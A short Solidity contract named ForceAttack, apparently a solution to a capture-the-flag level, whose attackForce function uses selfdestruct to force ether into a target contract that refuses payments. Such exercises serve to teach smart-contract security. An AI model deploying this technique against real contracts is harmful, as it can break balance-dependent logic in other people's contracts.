pragma solidity ^0.4.15;


contract ForceAttack {

    function ForceAttack() payable {

    }

    function () payable {

    }

    function attackForce(address forceAddr) {
        selfdestruct(forceAddr);
    }

}
